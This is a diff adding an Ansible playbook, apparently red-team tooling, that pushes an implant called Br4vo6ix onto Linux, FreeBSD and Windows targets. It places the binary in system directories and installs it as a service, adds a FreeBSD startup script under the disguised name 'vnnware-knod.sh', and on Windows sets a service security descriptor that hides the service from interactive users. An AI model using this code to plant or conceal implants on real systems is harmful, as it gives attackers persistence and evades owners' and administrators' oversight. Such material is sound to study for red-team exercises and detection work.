@@ -1,0 +1,49 @@
+---
+- name: Br4vo6ix | Implant | Copy implant to targets (Debian, RedHat, GNU)
+  ansible.builtin.copy:
+    src: "br4vo6ix/out/linux/{{ linux_file_name }}"
+    dest: /usr/sbin
+    mode: 0755
+  when: ansible_os_family == "Debian" or ansible_os_family == "RedHat" or ansible_os_family == "Kali GNU/Linux"
+
+- name: Br4vo6ix | Implant | Setup service unit file (Debian, RedHat, GNU)
+  ansible.builtin.shell: "/usr/sbin/{{ linux_file_name }} -service install"
+  when: ansible_os_family == "Debian" or ansible_os_family == "RedHat" or ansible_os_family == "Kali GNU/Linux"
+
+- name: Br4vo6ix | Implant | Start service (Debian, RedHat, GNU)
+  ansible.builtin.shell: "/usr/sbin/{{ linux_file_name }} -service start"
+  when: ansible_os_family == "Debian" or ansible_os_family == "RedHat" or ansible_os_family == "Kali GNU/Linux"
+
+- name: Br4vo6ix | Implant | Copy implant to targets (FreeBSD)
+  ansible.builtin.copy:
+    src: "br4vo6ix/out/linux/{{ freebsd_file_name }}"
+    dest: /usr/bin
+    mode: 0755
+  when: ansible_os_family == "FreeBSD"
+
+- name: Br4vo6ix | Implant | Add to rc.d (FreeBSD)
+  ansible.builtin.template:
+    src: "freebsd-rc.sh"
+    dest: /usr/local/etc/rc.d/vnnware-knod.sh
+    mode: 0755
+  when: ansible_os_family == "FreeBSD"
+
+- name: Br4vo6ix | Implant | Run the implant (FreeBSD)
+  shell: /usr/local/etc/rc.d/vnnware-knod.sh
+  when: ansible_os_family == "FreeBSD"
+
+- name: Br4vo6ix | Implant | Copy implant to targets (Windows)
+  win_copy:
+    src: "br4vo6ix/out/windows/{{ windows_file_name }}"
+    dest: "C:\\Windows\\System32\\{{ windows_file_name }}"
+
+- name: Br4vo6ix | Implant | Run the implant (Windows)
+  win_command: "{{ item }}"
+  args:
+    chdir: "C:\\Windows\\System32"
+  loop:
+    - "{{ windows_file_name }} -service install"
+    - "{{ windows_file_name }} -service start"
+
+- name: Br4vo6ix | Implant | Hide service
+  win_command: 'sc sdset "{{ windows_srv_name }}" D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)'
